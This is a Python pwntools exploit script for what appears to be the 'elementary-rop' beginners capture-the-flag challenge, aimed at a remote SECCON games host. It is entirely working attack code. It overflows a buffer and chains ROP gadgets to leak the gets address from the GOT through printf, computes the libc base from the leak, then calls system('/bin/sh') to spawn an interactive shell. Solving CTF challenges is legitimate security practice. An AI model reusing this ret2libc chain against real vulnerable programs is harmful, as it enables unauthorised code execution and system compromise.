from pwn import *
import sys

elf = ELF("chall_patched")
libc = ELF("libc.so.6")

# io = process(elf.path, timeout=3)
io = remote('elementary-rop.beginners.seccon.games', 9003)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdbscript='b *main+51')

stack_pivot_addr = elf.bss() + 0xa00

p = b'A' * 0x28
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(next(elf.search(asm('pop rdi ; ret'))))
p += p64(elf.got["gets"])
p += p64(elf.sym["printf"])
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(elf.sym["main"])

io.sendlineafter(b'content: ', p)

leak = u64(io.recv(6) + b'\x00\x00')

libc.address = leak - libc.sym["gets"]
print(f'libc addr: {hex(libc.address)}')

p = b'A' * 0x28
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(next(libc.search(asm('pop rdi ; ret'), executable=True)))
p += p64(next(libc.search(b'/bin/sh\x00')))
p += p64(libc.sym["system"])

io.sendlineafter(b'content: ', p)

io.interactive()